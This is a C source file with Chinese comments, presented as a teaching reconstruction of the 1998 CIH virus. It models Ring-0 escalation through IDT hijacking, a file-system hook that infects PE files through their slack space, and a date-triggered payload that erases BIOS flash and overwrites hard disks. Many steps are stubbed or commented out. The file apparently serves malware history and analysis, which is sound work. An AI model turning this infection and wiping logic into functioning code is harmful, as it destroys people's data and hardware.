/**
 * 概念性 CIH 病毒逻辑演示 (教学用途)
 * 
 * 历史背景: CIH 病毒爆发于 1998 年，利用了 Windows 95/98 操作系统中
 * 缺乏严格的内核态(Ring-0)与用户态(Ring-3)隔离的架构缺陷。
 * 
 * 核心技术:
 * 1. IDT 劫持 (提权): 通过修改中断描述符表进入 Ring-0。
 * 2. 碎片/孔洞感染 (Spacefilling): 将病毒代码拆分塞入 PE 文件节区末尾的对齐空隙中，不增加文件大小。
 * 3. 文件系统钩子 (IFS Hook): 拦截系统级文件操作，实现驻留和静默感染。
 * 4. 直接硬件破坏: 绕过操作系统直接擦除 BIOS 固件和硬盘 MBR。

 * Translated by Gemini 3.1 Pro Preview
 */

#include <windows.h>
#include <winnt.h> // 包含 PE 文件结构的定义

// ---------------------------------------------------------
// 抽象出的全局变量和宏定义 (模拟汇编中的寄存器和静态数据)
// ---------------------------------------------------------
#define HOOK_EXCEPTION_NUMBER 0x03 // 劫持的中断号 (INT 3 或 INT 5)
#define VIRUS_SIZE 1019            // 病毒基础大小 (v1.4 版本)

void* DR0_Register = NULL;         // 模拟硬件调试寄存器，用作病毒是否已驻留内存的标记
void* OldFileSystemApiHook = NULL; // 保存原系统的文件系统 API 函数指针
int OnBusy = 0;                    // 防止文件系统钩子无限递归重入的标志位

// 声明外部的抽象函数 (代表底层操作系统或硬件调用)
extern void OriginalAppEntryPoint();
extern void* GetIDTBaseAddress();
extern void TriggerInterrupt(int intNumber);
extern void* VMMCALL_PageAllocate();
extern void* VXDCALL_IFSMgr_InstallFileSystemApiHook(void* HookFunction);
extern int VXDCALL_IFSMgr_Ring0_FileIO(int operation, ...);
extern int VXDCALL_IOS_SendCommand(int command, ...);
extern char InPortByte(short port);
extern void OutPortByte(short port, char data);

// 提前声明函数
void MyExceptionHook();
int FileSystemApiHook(int function, void* pioreq);
void CheckKillDateTrigger();

// =========================================================
// 第一阶段：用户态 (Ring-3) 入口点 - 触发特权提升
// =========================================================
void MyVirusStart() {
    // 1. 结构化异常处理 (SEH) 拦截
    // CIH 只能在 Windows 9x 运行。如果运行在基于 NT 内核的系统(如 Win2000/XP)，
    // 以下越权操作会导致程序崩溃。通过设置 SEH，病毒可以捕获崩溃并静默退出，将控制权还给宿主。
    __try {
        
        // 2. 劫持 IDT (中断描述符表) 获取 Ring-0 特权
        // 在 Win9x 中，IDT 存放于固定的内存区域且所有程序可写。
        // 汇编中通过 'sidt' 指令获取基址。
        void* idtBase = GetIDTBaseAddress(); 
        
        // 计算特定中断向量（如 INT 3）在 IDT 中的地址
        void** interruptVector = (void**)((char*)idtBase + (HOOK_EXCEPTION_NUMBER * 8) + 4);
        
        // 保存原始的中断处理程序地址，并将中断向量指向病毒自己的 Ring-0 代码
        void* oldVector = *interruptVector;
        *interruptVector = MyExceptionHook; 

        // 3. 触发异常 (主动产生中断)
        // CPU 捕获到中断后，会切换到内核态 (Ring-0) 并跳转到 MyExceptionHook 执行
        TriggerInterrupt(HOOK_EXCEPTION_NUMBER); 

        // 4. 合并病毒体
        // 因为 CIH 采用“孔洞感染”，病毒代码被切片存放在文件的不同部分。
        // 此时在内存中需要遍历包含病毒大小和偏移的表，将病毒碎片拼凑回完整的执行体。
        // MergeAllVirusCodeSections();

    } __except (EXCEPTION_EXECUTE_HANDLER) {
        // 如果触发了操作系统的内存保护机制 (如在 WinNT 下)，直接忽略错误
    }

    // 5. 伪装正常运行：将执行流跳回被感染宿主程序的原始入口点
    OriginalAppEntryPoint();
}

// =========================================================
// 第二阶段：内核态 (Ring-0) 初始化 - 内存驻留与挂钩
// =========================================================
void MyExceptionHook() {
    // 此函数运行于操作系统的最高权限级别 (Ring-0)

    // 1. 检查病毒是否已经驻留在内存中 (通过检查 DR0 寄存器)
    if (DR0_Register == NULL) {
        
        // 2. 分配系统内核内存 (Ring-0 内存)
        // 利用 Windows 9x 的 VxD 调用 (INT 20h)，调用 VMM (虚拟机管理器) 的 _PageAllocate 服务
        void* systemMemory = VMMCALL_PageAllocate(2 /* 页数 */);
        
        // 将重组后的完整病毒体复制到这块永远不会被换出到硬盘的内核内存中
        // CopyMemory(systemMemory, MyVirusStart, VIRUS_SIZE);
        
        // 将分配的内存地址存入 DR0，作为已感染标记
        DR0_Register = systemMemory;

        // 3. 安装可安装文件系统 (IFS) 钩子
        // 调用 IFSMgr_InstallFileSystemApiHook，拦截操作系统层面的所有文件读写/打开操作
        OldFileSystemApiHook = VXDCALL_IFSMgr_InstallFileSystemApiHook(FileSystemApiHook);
    }

    // 4. 清理并返回 Ring-3
    // 恢复被劫持的中断向量，并执行 'iretd' 指令返回用户态原始程序的执行流
    // RestoreOriginalInterruptVector();
    // ReturnFromInterrupt(); 
}

// =========================================================
// 第三阶段：文件系统钩子 - 拦截并执行孔洞感染 (Spacefilling)
// =========================================================
int FileSystemApiHook(int function, void* pioreq) {
    // 1. 防止死锁与重入：如果病毒自己正在操作文件，则跳过拦截
    if (OnBusy) goto CallOriginalIFS;

    // 2. 只拦截 "打开文件" 操作 (操作码 0x24)
    if (function != 0x24) goto CallOriginalIFS;

    OnBusy = 1; // 开启忙碌标志

    char fileName[MAX_PATH];
    // 从 I/O 请求结构体中提取目标文件名 (汇编中调用了 UniToBCSPath 服务)
    // GetFileNameFromRequest(pioreq, fileName); 

    // 3. 目标筛选：只感染 .EXE 文件
    // (根据汇编注释 v1.4：修复了感染 WinZip 自解压文件导致损坏的 Bug，因此跳过 WinZip 相关文件)
    // if (!EndsWith(fileName, ".EXE") || IsWinZipExtractor(fileName)) goto Cleanup;

    // 检查是否正在打开一个已存在的文件
    // if (!IsOpeningExistingFile(pioreq)) goto Cleanup;

    // 4. 绕过只读属性
    int oldAttributes = VXDCALL_IFSMgr_Ring0_FileIO(0x4300 /* GetAttributes */, fileName);
    if (oldAttributes & FILE_ATTRIBUTE_READONLY) {
        VXDCALL_IFSMgr_Ring0_FileIO(0x4301 /* SetAttributes */, fileName, FILE_ATTRIBUTE_NORMAL);
    }

    // 在 Ring-0 打开文件，获取句柄
    HANDLE hFile = (HANDLE)VXDCALL_IFSMgr_Ring0_FileIO(0xD500 /* OpenFile */, fileName);

    // 5. 解析 PE (Portable Executable) 文件头
    unsigned char headerBuffer[512];
    VXDCALL_IFSMgr_Ring0_FileIO(0xD600 /* ReadFile */, hFile, headerBuffer, sizeof(headerBuffer));
    
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headerBuffer;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(headerBuffer + dosHeader->e_lfanew);

    // 检查 PE 签名 "PE\0\0" 以及文件是否已经被 CIH 感染过
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE /* || 包含 CIH 感染标记 */) {
        goto CloseAndCleanup;
    }

    // 6. 核心技术：孔洞感染 (Cavity Infection) 评估
    // CIH 的绝技：绝不增加宿主文件的大小，从而躲过早期杀毒软件的文件大小异常检测。
    // PE 文件在磁盘上按一定边界对齐（通常是 512 字节），如果代码没有占满对齐块，就会产生空白的“节区尾部间隙”(Slack space)。
    int totalSlackSpace = 0;
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        // 磁盘上分配的对齐大小 (SizeOfRawData) 减去 实际虚拟代码大小 (VirtualSize) = 可用的空白空间
        int slack = section[i].SizeOfRawData - section[i].Misc.VirtualSize;
        if (slack > 0) {
            totalSlackSpace += slack;
            // 将包含病毒代码的节区属性修改为 可读、可写、可执行
            section[i].Characteristics |= (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE);
        }
    }

    // 7. 实施感染
    // 如果文件中所有节区的空白缝隙加起来，足够容纳病毒体 (约 1019 字节)
    if (totalSlackSpace >= VIRUS_SIZE) {
        // a. 修改 PE 头的 AddressOfEntryPoint，使其指向病毒片段的第一部分
        // ntHeaders->OptionalHeader.AddressOfEntryPoint = ...;

        // b. 将病毒切片，分别写入各个节区的尾部空隙，并在代码中插入跳转指令(JMP)将它们连接起来
        // InjectVirusIntoSectionCavities(hFile, ntHeaders, section);
        
        // c. 将修改后的 PE 头写回文件
        // VXDCALL_IFSMgr_Ring0_FileIO(0xD601 /* WriteFile */, hFile, headerBuffer, ...);
    }

CloseAndCleanup:
    // 8. 隐蔽行踪：恢复文件原有的修改时间，防止用户发现文件被篡改
    // RestoreFileModificationTime(hFile, originalTime);
    VXDCALL_IFSMgr_Ring0_FileIO(0xD700 /* CloseFile */, hFile);
    
    // 恢复只读属性
    if (oldAttributes & FILE_ATTRIBUTE_READONLY) {
        VXDCALL_IFSMgr_Ring0_FileIO(0x4301 /* SetAttributes */, fileName, oldAttributes);
    }

Cleanup:
    OnBusy = 0; // 解除忙碌标志

CallOriginalIFS:
    // 9. 将执行权交给操作系统真正的 IFS 管理器，完成正常的文件打开操作
    // int result = ((int (*)(int, void*))OldFileSystemApiHook)(function, pioreq);
    
    // 10. 文件操作完成后，检查是否满足破坏性载荷的触发条件
    CheckKillDateTrigger();
    
    return 0; // return result;
}

// =========================================================
// 第四阶段：破坏性载荷 (The Payload)
// =========================================================
void CheckKillDateTrigger() {
    // 1. 直接读取主板 CMOS 端口获取硬件时间
    OutPortByte(0x70, 0x07);      // 向 70h 端口写入 07h，选择 CMOS 的 "日" 寄存器
    char day = InPortByte(0x71);  // 从 71h 端口读取当前日期
    
    // 判断是否为 26 号 (配合其他逻辑即 4月26日切尔诺贝利核事故纪念日)
    // 汇编代码中使用了异或逻辑： xor al, 26h (如果相等则结果为0，触发破坏)
    if (day == 0x26) {
        
        // =========================================
        // 破坏行动 1：擦除 BIOS (Flash EEPROM)
        // =========================================
        // 病毒尝试直接向指定的硬件 I/O 端口写入特定的序列，以解开主板 BIOS 芯片的写保护
        // (汇编中的 IOForEEPROM 函数)
        OutPortByte(0xCF8, 0x8000384C); // 模拟向 PCI 控制器发送特定指令解锁 EEPROM
        // ... (省略复杂的硬件解锁序列) ...

        // 解锁后，直接通过物理内存地址覆盖 BIOS 数据
        // 在 PC 架构中，0x000E0000 到 0x000FFFFF 通常映射着 BIOS ROM
        volatile char* biosMemory = (volatile char*)0x000E0000;
        for (int i = 0; i < 0x20000; i++) { // 循环 128 KB
            biosMemory[i] = 0x00; // 写入 0，彻底破坏 BIOS，导致主板变砖、电脑无法开机
        }

        // =========================================
        // 破坏行动 2：无差别覆盖所有硬盘驱动器
        // =========================================
        // 绕过文件系统，直接调用底层的 I/O 子系统发送物理扇区写命令
        // FirstKillHardDiskNumber 在 ASM 中定义为 0x80 (第一块物理硬盘)
        for (int driveNumber = 0x80; driveNumber < 0x84; driveNumber++) {
            int currentSector = 0; // 从扇区 0 开始 (即包含分区表和启动引导代码的 MBR)
            
            while (1) {
                // 模拟 VXDCall IOS_SendCommand (INT 20h, 00100004h)
                // 指令为 0x0105 (写入物理扇区)，覆盖内容为内存中的垃圾数据(通常是 0)
                int status = VXDCALL_IOS_SendCommand(0x0105, driveNumber, currentSector);
                
                // 0x0017 表示错误或已到达磁盘末尾
                if (status == 0x0017) break; 
                
                currentSector += 256; // 继续覆盖后续扇区，导致硬盘数据彻底丢失且无法恢复
            }
        }
    }
}
